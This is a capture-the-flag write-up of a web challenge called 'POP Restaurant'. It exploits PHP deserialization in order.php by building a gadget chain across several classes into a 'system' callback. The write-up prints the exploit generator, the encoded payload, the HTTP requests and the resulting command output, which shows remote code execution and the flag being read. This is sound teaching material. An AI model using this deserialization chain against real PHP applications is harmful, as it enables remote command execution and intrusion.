# POP Restaurant

### ===== Challenge =====

- Spent a week to create this food ordering system. Hope that it will not have any critical vulnerability in my application.

### ===== Analysis =====

- After creating an account I am presented with this page. It allows me to order food via a POST request to `/order.php`

![](../../../assets/landing_POPRestaurant.png)



``` http
POST /order.php HTTP/1.1
Host: 94.237.48.12:44755
Content-Length: 89
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://94.237.48.12:44755
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://94.237.48.12:44755/index.php<?php

data=Tzo1OiJQaXp6YSI6Mzp7czo1OiJwcmljZSI7TjtzOjY6ImNoZWVzZSI7TjtzOjQ6InNpemUiO047fQ%3D%3D
```

- When I Base64 decode the data in the request I get:
    `O:5:"Pizza":3:{s:5:"price";N;s:6:"cheese";N;s:4:"size";N;}`
- This is a serialized PHP object, and I can see it being directly deserialized in the source code of `order.php`

```php
[...]
isAuthenticated();
$username = $_SESSION['username'];
$id = $_SESSION['id'];
$db = new Database();
$order = unserialize(base64_decode($_POST['data']));
$foodName = get_class($order);
[...]
```
- I start looking for classes with **Magic Methods** (https://www.php.net/manual/en/language.oop5.magic.php) that will allow me to exploit this vulnerability. And I find these ones:

```php
<?php
class IceCream{
	public $flavors;
	
	public $topping;
	public function __invoke(){
		foreach ($this->flavors as $flavor) {
			echo $flavor;
		}
	}
}
```

``` php
<?php
class Pizza{
	public $price;
	public $cheese;
	public $size;
	public function __destruct(){
		echo $this->size->what;
	}
}
```

```php
<?php
	class Spaghetti {
	public $sauce;
	public $noodles;
	public $portion;
	public function __get($tomato)
	{
		($this->sauce)();
	}
}
```
- The **POP chain** that immediately jumps to my attention is:
    -  Pizza's **__destruct()** calls Spaghetti's **__get()** by trying to access an attribute that doesn't exist in the Spaghetti class.
    - Spaghetti's __gets() calls IceCreams's **__invoke()** by calling it as if it were a function.
- And then I didn't know what to do to exploit this chain, but after searching some more I found this class:

``` php
<?php
namespace Helpers{

	use ArrayIterator;
		class ArrayHelpers extends ArrayIterator{
		public $callback;
		
		public function current()
		{
			$value = parent::current();
			echo $value;
			$debug = call_user_func($this->callback, $value);
			return $value;
		}
	}
}
```
- It's a custom implementation of the **ArrayIterator** class, that after echoing the current element of the array, calls the function in the *$callback* attribute with the current value as the argument.
- The **current()** function (https://www.geeksforgeeks.org/php/php-arrayiterator-current-function/) is called when a **foreach** clause is present, which is the case in IceCream's __invoke(), that iterates through the *$flavors* array.
- If I set the IceCream's *\$flavors* to a **ArrayHelpers** that has a *$callback* of 'system', and is iterating through an array of commands, I have RCE on the server. 

### ===== Exploitation =====

- The exploit (it was a pain because of the namespaces ;( ):

```php
namespace Helpers {
    use ArrayIterator;

    class ArrayHelpers extends ArrayIterator
    {
        public $callback;
    }
}

namespace {
    class IceCream
    {
        public function __construct(){
            $ah = new \Helpers\ArrayHelpers(['ls /']);
            $ah->callback = 'system';
            $this->flavors = $ah;
            $this->topping = 'whatever';
        }
    }

    class Spaghetti
    {
        public function __construct(){
            $this->sauce  = new IceCream();
            $this->noodles = True;
            $this->portion = "big";
        }
    }

    class Pizza
    {
        public function __construct(){
            $this->price  = 12;
            $this->cheese = True;
            $this->size   = new Spaghetti();
        }
    }

    $p = new Pizza();
    echo base64_encode(serialize($p)) . "\n";
}
```
- When I send the serialized and encoded object chain, I get RCE!

``` http
POST /order.php HTTP/1.1
Host: 94.237.48.12:44755
Content-Length: 413
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://94.237.48.12:44755
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://94.237.48.12:44755/index.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=561aa61236020ea4642c3e56ef1450f7
Connection: keep-alive

data=Tzo1OiJQaXp6YSI6Mzp7czo1OiJwcmljZSI7aToxMjtzOjY6ImNoZWVzZSI7YjoxO3M6NDoic2l6ZSI7Tzo5OiJTcGFnaGV0dGkiOjM6e3M6NToic2F1Y2UiO086ODoiSWNlQ3JlYW0iOjI6e3M6NzoiZmxhdm9ycyI7TzoyMDoiSGVscGVyc1xBcnJheUhlbHBlcnMiOjQ6e2k6MDtpOjA7aToxO2E6MTp7aTowO3M6NDoibHMgLyI7fWk6MjthOjE6e3M6ODoiY2FsbGJhY2siO3M6Njoic3lzdGVtIjt9aTozO047fXM6NzoidG9wcGluZyI7czo4OiJ3aGF0ZXZlciI7fXM6Nzoibm9vZGxlcyI7YjoxO3M6NzoicG9ydGlvbiI7czozOiJiaWciO319
```

``` http
HTTP/1.1 302 Found
Date: Thu, 16 Oct 2025 15:10:58 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: index.php
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
Content-Length: 111

bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
pBhfMBQlu9uT_flag.txt
proc
root
run
sbin
srv
sys
tmp
usr
var
ls /
```

- After that, I just change the command to cat the flag


``` http
HTTP/1.1 302 Found
Date: Thu, 16 Oct 2025 15:18:55 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: index.php
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
Content-Length: 55

HTB{<REDACTED>}cat /pBhfMBQlu9uT_flag.txt
```

writeup by *varanda* - 16/10/2025
